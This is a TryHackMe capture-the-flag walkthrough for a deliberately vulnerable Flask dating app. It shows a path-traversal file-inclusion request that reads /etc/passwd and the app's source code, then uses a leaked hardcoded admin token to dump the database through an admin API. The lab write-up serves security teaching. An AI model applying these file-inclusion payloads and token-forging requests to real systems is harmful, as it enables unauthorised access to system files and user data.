
# TryHackMe

Room
[https://tryhackme.com/room/lafb2026e10](https://tryhackme.com/room/lafb2026e10)

## Challenge

**Valenfind**

> My Dearest Hacker,
> There’s this new dating app called “Valenfind” that just popped up out of nowhere. I hear the creator only learned to code this year; surely this must be vibe-coded. Can you exploit it?

Goal: What is the flag?

---

# Walkthrough

## 1 Register an account

Create a user account.

```
http://10.64.148.200:5000/register
```

---

## 2 Open a user profile

After logging in, open any profile page.

---

## 3 Inspect the Profile Theme request

Open **Developer Tools → Network tab** and change the **Profile Theme** option.

You will see a request like:

```
http://10.64.148.200:5000/api/fetch_layout?layout=theme_classic.html
```

The `layout` parameter appears to load a file from the server.

---

## 4 Test for Local File Inclusion

Modify the `layout` parameter.

**Before**

```
http://10.64.148.200:5000/api/fetch_layout?layout=theme_classic.html
```

**After**

```
http://10.64.148.200:5000/api/fetch_layout?layout=/etc/passwd
```

The response returns the contents of `/etc/passwd`, confirming an **LFI vulnerability**.

---

## 5 Identify the application path

Requesting a non-existent file reveals an error message:

```
Error loading theme layout: [Errno 2] No such file or directory:
/opt/Valenfind/templates/components/
```

This exposes the application directory:

```
/opt/Valenfind/
```

---

## 6 Identify the application framework

Using curl:

```bash
curl -I 10.64.148.200:5000
```

Response headers show:

```
Server: Werkzeug/3.0.1 Python/3.12.3
```

This indicates a **Flask (Python) application**, which commonly uses an `app.py` file.

---

## 7 Read the application source code

Use the LFI to read the Flask application.

```
http://10.64.148.200:5000/api/fetch_layout?layout=/opt/Valenfind/app.py
```

Inside `app.py` we find important information.

### Variables

```
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
DATABASE = 'cupid.db'
```

### Admin endpoint

```
@app.route('/api/admin/export_db')
```

### Authentication header

```
auth_header = request.headers.get('X-Valentine-Token')
```

---

## 8 Identify the attack path

From the source code we learn:

* There is an **admin API endpoint**
* It exports the **database**
* It requires the header

```
X-Valentine-Token
```

The required token is exposed in the source code:

```
CUPID_MASTER_KEY_2024_XOXO
```

---

## 9 Call the admin API endpoint

Intercept the request with **Burp Suite** or **Caido** and add the header.

```
GET /api/admin/export_db HTTP/1.1
Host: 10.64.148.200:5000
X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO
```

The response returns the database contents.

You can simply search the response for:

```
THM{
```

---

## Alternative Method (Browser DevTools)

If sending the request from **Developer Tools**, the response may appear **base64 encoded**.

Steps:

1. Copy the response
2. Base64 decode it
3. Search for:

```
THM{
```

---

# Flag

```
THM{REDACTED}
```

---

# Dead Ends

The following attack paths were tested but did not lead to the flag.

* Nmap scans for abnormal services
* SQL injection in login or registration forms
* Gobuster enumeration

  * would eventually reveal the API endpoint but not the key
* XSS in profile inputs
* Server-side template injection
* LFI attempts on SSH keys

---
